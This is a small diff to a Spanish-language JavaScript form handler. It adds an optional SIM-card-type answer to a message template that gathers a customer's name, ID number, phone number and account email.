@@ -10,6 +10,7 @@ function recibeInformacion(event){
     nombre : ${formulario.get('nombresCliente')}
     cedula : ${formulario.get('documentoIndentidad')};
     Número : ${formulario.get('minCliente')}
+    ${formulario.get('answerTipoSimcard') != "" ? formulario.get('answerTipoSimcard'):"" }
 
     🔒 ¿Cual es el correo que esta asociado a tu cuenta APP ❓   
 
